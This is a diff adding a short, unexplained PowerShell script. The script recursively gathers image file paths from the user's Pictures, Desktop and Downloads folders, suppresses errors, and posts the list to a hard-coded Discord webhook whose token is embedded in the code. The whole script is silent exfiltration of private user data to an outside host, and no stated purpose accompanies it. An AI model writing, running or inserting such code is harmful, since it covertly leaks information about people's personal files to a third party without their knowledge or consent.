@@ -1,0 +1,38 @@
+$d = 'https://discord.com/api/webhooks/1530827985119088745/q5uT6bwcAFbi6YAn4QvkT6WuQORBA8IjLlE48IRTAMCFusFmBEL1pSKHR47eQbNkpfPL'
+
+$p = @(
+    "$env:USERPROFILE\Pictures",
+    "$env:USERPROFILE\Desktop",
+    "$env:USERPROFILE\Downloads"
+)
+
+$l = ''
+
+foreach ($i in $p) {
+    if (Test-Path $i) {
+        Get-ChildItem `
+            -Path $i `
+            -Recurse `
+            -Include @('*.jpg','*.jpeg','*.png','*.gif','*.bmp') `
+            -ErrorAction SilentlyContinue |
+        Select-Object -First 10 |
+        ForEach-Object {
+            $l += $_.FullName + "`n"
+        }
+    }
+}
+
+
+if ($l) {
+    $b = @{
+        content = $l
+    } | ConvertTo-Json
+
+    Invoke-RestMethod `
+        -Uri $d `
+        -Method Post `
+        -Body $b `
+        -ContentType 'application/json'
+}
+
+exit
